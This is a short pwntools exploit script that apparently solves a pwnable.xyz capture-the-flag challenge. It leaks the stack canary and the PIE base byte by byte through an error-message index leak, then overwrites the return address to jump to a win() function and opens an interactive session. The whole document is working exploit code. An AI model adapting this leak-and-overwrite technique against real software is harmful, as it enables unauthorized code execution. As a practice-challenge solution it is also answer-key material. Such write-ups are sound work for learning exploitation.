from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30017)

sla = r.sendlineafter
sa = r.sendafter

win_offset = 0xaac # offset of win() from PIE base


sla('Message: ', 'A')


# canary leak

canary = '\x00'

for offset in range(11, 18):
    sla('> ', chr(offset + 0x30))
    r.recvuntil('Error: ')
    canary += chr(int(r.recvuntil(' ')[:-1]))

canary = u64(canary)
log.info('canary: ' + hex(canary))


# PIE leak

pie = ''

for offset in range(26, 32):
    sla('> ', chr(offset + 0x30))
    r.recvuntil('Error: ')
    pie += chr(int(r.recvuntil(' ')[:-1]))

pie = pie.ljust(8, '\x00')
pie = u64(pie) - 0xb30 # PIE base
log.info('PIE base: ' + hex(pie))
win = pie + win_offset


# RET overwrite

payload = b'A' * 0x28
payload += p64(canary)
payload += b'A' * 8
payload += p64(win)

sla('> ', '1')
sla('Message: ', payload)

sla('> ', '0') # return main()


r.interactive()